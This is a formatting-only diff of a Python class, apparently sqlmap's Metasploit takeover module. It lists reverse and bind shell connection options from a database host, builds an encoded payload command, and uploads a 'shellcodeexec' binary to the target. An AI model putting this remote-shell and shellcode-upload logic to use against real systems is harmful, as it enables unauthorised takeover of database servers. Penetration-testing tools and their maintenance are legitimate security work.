@@ -50,6 +50,7 @@ from thirdparty import six
 if IS_WIN:
     import msvcrt
 
+
 class Metasploit:
     """
     This class defines methods to call Metasploit for plugins.
@@ -104,9 +105,13 @@ class Metasploit:
         self._msfConnectionsList = {
             "windows": {
                 1: ("Reverse TCP: Connect back from the database host to this machine (default)", "reverse_tcp"),
-                2: ("Reverse TCP: Try to connect back from the database host to this machine, on all ports between the specified and 65535", "reverse_tcp_allports"),
-                3: ("Reverse HTTP: Connect back from the database host to this machine tunnelling traffic over HTTP", "reverse_http"),
-                4: ("Reverse HTTPS: Connect back from the database host to this machine tunnelling traffic over HTTPS", "reverse_https"),
+                2: (
+                "Reverse TCP: Try to connect back from the database host to this machine, on all ports between the specified and 65535",
+                "reverse_tcp_allports"),
+                3: ("Reverse HTTP: Connect back from the database host to this machine tunnelling traffic over HTTP",
+                    "reverse_http"),
+                4: ("Reverse HTTPS: Connect back from the database host to this machine tunnelling traffic over HTTPS",
+                    "reverse_https"),
                 5: ("Bind TCP: Listen on the database host for a connection", "bind_tcp"),
             },
             "linux": {
@@ -412,7 +417,8 @@ class Metasploit:
 
         if kb.oldMsf:
             if extra == "BufferRegister=EAX":
-                self._payloadCmd += " R | %s -a x86 -e %s -o \"%s\" -t %s" % (self._msfEncode, self.encoderStr, outFile, format)
+                self._payloadCmd += " R | %s -a x86 -e %s -o \"%s\" -t %s" % (
+                self._msfEncode, self.encoderStr, outFile, format)
 
                 if extra is not None:
                     self._payloadCmd += " %s" % extra
@@ -530,9 +536,9 @@ class Metasploit:
                         if msvcrt.kbhit():
                             char = msvcrt.getche()
 
-                            if ord(char) == 13:     # enter_key
+                            if ord(char) == 13:  # enter_key
                                 break
-                            elif ord(char) >= 32:   # space_char
+                            elif ord(char) >= 32:  # space_char
                                 inp += char
 
                         if len(inp) == 0 and (time.time() - _) > timeout:
@@ -643,14 +649,16 @@ class Metasploit:
             self.shellcodeexecLocal = os.path.join(self.shellcodeexecLocal, "windows", "shellcodeexec.x%s.exe_" % "32")
             content = decloak(self.shellcodeexecLocal)
             if SHELLCODEEXEC_RANDOM_STRING_MARKER in content:
-                content = content.replace(SHELLCODEEXEC_RANDOM_STRING_MARKER, randomStr(len(SHELLCODEEXEC_RANDOM_STRING_MARKER)))
+                content = content.replace(SHELLCODEEXEC_RANDOM_STRING_MARKER,
+                                          randomStr(len(SHELLCODEEXEC_RANDOM_STRING_MARKER)))
                 _ = cloak(data=content)
                 handle, self.shellcodeexecLocal = tempfile.mkstemp(suffix="%s.exe_" % "32")
                 os.close(handle)
                 with open(self.shellcodeexecLocal, "w+b") as f:
                     f.write(_)
         else:
-            self.shellcodeexecLocal = os.path.join(self.shellcodeexecLocal, "linux", "shellcodeexec.x%s_" % Backend.getArch())
+            self.shellcodeexecLocal = os.path.join(self.shellcodeexecLocal, "linux",
+                                                   "shellcodeexec.x%s_" % Backend.getArch())
 
         __basename = "tmpse%s%s" % (self._randStr, ".exe" if Backend.isOs(OS.WINDOWS) else "")
 
@@ -660,7 +668,8 @@ class Metasploit:
         logger.info("uploading shellcodeexec to '%s'" % self.shellcodeexecRemote)
 
         if web:
-            written = self.webUpload(self.shellcodeexecRemote, os.path.split(self.shellcodeexecRemote)[0], filepath=self.shellcodeexecLocal)
+            written = self.webUpload(self.shellcodeexecRemote, os.path.split(self.shellcodeexecRemote)[0],
+                                     filepath=self.shellcodeexecLocal)
         else:
             written = self.writeFile(self.shellcodeexecLocal, self.shellcodeexecRemote, "binary", forceCheck=True)
 
